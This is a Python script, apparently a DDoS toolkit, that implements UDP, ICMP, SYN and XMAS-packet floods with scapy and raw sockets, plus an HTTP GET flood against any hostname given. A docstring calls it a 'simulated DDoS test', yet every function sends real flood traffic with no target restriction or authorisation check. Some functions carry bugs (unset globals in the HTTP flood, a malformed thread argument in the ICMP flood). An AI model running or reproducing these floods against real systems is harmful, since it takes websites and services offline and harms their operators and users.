from urllib.parse import urlparse

from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP

import random
import socket
import string
import sys
import threading
import time

loops = 10000


def resolve_to_ipv4(target: str) -> list[str]:
    """
    Resolves a hostname or URL to a list of its unique IPv4 addresses.

    This function can handle full URLs (e.g., 'https://www.google.com/search')
    and simple hostnames (e.g., 'google.com').

    :param target: The URL or hostname string to resolve.
    :return: A list of unique IPv4 address strings, or an empty list if
             resolution fails or no IPv4 records are found.
    """
    try:
        # Prepend a scheme if one is missing to ensure urlparse works correctly
        if "://" not in target:
            target = "http://" + target

        # Extract the hostname (e.g., 'www.google.com') from the full URL
        hostname = urlparse(target).hostname

        if not hostname:
            # urlparse failed to find a hostname
            return []

        # Get address information, filtering for the IPv4 family
        # socket.AF_INET specifies IPv4
        addr_info = socket.getaddrinfo(hostname, None, family=socket.AF_INET)

        # The result is a list of tuples. The IP is in the 4th element's 0th index.
        # Use a set comprehension for automatic deduplication of IPs.
        ips = {item[4][0] for item in addr_info}

        return sorted(list(ips))

    except socket.gaierror:
        # This error occurs if DNS resolution fails (e.g., domain doesn't exist)
        return []
    except Exception:
        # Catch any other unexpected errors
        return []


def send_packet(amplifier, host, port):
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except:
        return s.close()


# This is the new worker function that each thread will run.
# It continuously calls send_packet until the 'stop_event' is set.
def udp_worker(stop_event, packet_size, host, port):
    """
    A worker function that sends packets in a loop until signalled to stop.
    """
    while not stop_event.is_set():
        send_packet(packet_size, host, port)
        # You might want a tiny sleep to prevent 100% CPU usage on one core
        # just from this loop, depending on how fast send_packet is.
        # time.sleep(0.001)


# --- Your Corrected Test Function ---

def attack_UDP(method, host_url, port, duration, threads_per_method=100):
    """
    Runs a simulated DDoS test for a specific duration.

    :param method: The flood method ("UDP-Flood", "UDP-Power", "UDP-Mix")
    :param host_url: Target url
    :param port: Target port
    :param duration: How long the test should run, in seconds
    :param threads_per_method: How many concurrent threads to spawn for each task
    """

    hosts = resolve_to_ipv4(host_url)
    for host in hosts:
        print(f"--- Starting test: {method} on {host}:{port} for {duration} seconds ---")

        # A threading.Event is a safe way to signal threads to stop.
        stop_event = threading.Event()
        threads = []

        # A helper function to create and start a thread
        def launch_thread(size):
            # Note: we use `args` to pass arguments to the target function
            thread = threading.Thread(target=udp_worker, args=(stop_event, size, host, port))
            thread.daemon = True  # Daemon threads will exit when the main program exits
            thread.start()
            threads.append(thread)

        if method == "UDP-Flood":
            for _ in range(threads_per_method):
                launch_thread(375)
        elif method == "UDP-Power":
            for _ in range(threads_per_method):
                launch_thread(750)
        elif method == "UDP-Mix":
            for _ in range(threads_per_method):
                launch_thread(375)
                launch_thread(750)
        else:
            print(f"Error: Unknown method '{method}'")
            return  # Exit the function if the method is invalid

        # Let the threads run for the specified duration
        time.sleep(duration)

        # The timer has expired, now we signal the threads to stop
        print("\n--- Timeout reached. Signaling threads to stop... ---")
        stop_event.set()

        # (Optional but good practice) Wait for all threads to finish cleanly
        for thread in threads:
            thread.join()

        print(f"--- Test function for {method} has finished. ---")


def attack_icmp_helper(target):
    send(IP(dst=target) / ICMP())


def icmpflood(target_url, cycle):
    targets = resolve_to_ipv4(target_url)
    all_threads = []
    for target in targets:
        for x in range(0, int(cycle)):
                t1 = threading.Thread(target=attack_icmp_helper, args=target)
                t1.start()
                all_threads.append(t1)

                # Adjusting this sleep time will affect requests per second
                time.sleep(0.01)

        for current_thread in all_threads:
            current_thread.join()  # Make the main thread wait for the children threads


def attack_synflood_helper(target, targetPort):
    send(IP(dst=target) / TCP(dport=targetPort,
                              flags="S",
                              seq=RandShort(),
                              ack=RandShort(),
                              sport=RandShort()))


def synflood(target_url, targetPort, cycle):
    all_threads = []
    targets = resolve_to_ipv4(target_url)
    for target in targets:
        for x in range(0, int(cycle)):
            t1 = threading.Thread(target=attack_synflood_helper, args=(target, targetPort))
            t1.start()
            all_threads.append(t1)

            # Adjusting this sleep time will affect requests per second
            time.sleep(0.01)

        for current_thread in all_threads:
            current_thread.join()  # Make the main thread wait for the children threads


def attack_xmas_helper(target, targetPort):
    send(IP(dst=target) / TCP(dport=targetPort,
                              flags="FSRPAUEC",
                              seq=RandShort(),
                              ack=RandShort(),
                              sport=RandShort()))


def xmasflood(target_url, targetPort, cycle):
    all_threads= []
    targets = resolve_to_ipv4(target_url)
    for target in targets:
        for x in range(0, int(cycle)):
            t1 = threading.Thread(target=attack_xmas_helper, args=(target, targetPort))
            t1.start()
            all_threads.append(t1)

            # Adjusting this sleep time will affect requests per second
            time.sleep(0.01)

        for current_thread in all_threads:
            current_thread.join()  # Make the main thread wait for the children threads



# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


def attack_http_flood(target, target_port, num_of_requests):
    host = target
    port = target_port
    num_requests = num_of_requests
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(" ERROR\n Make sure you entered a correct website")
        sys.exit(2)
    print(f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")

    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack_http_flood_helper)
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack_http_flood_helper():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print(f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()
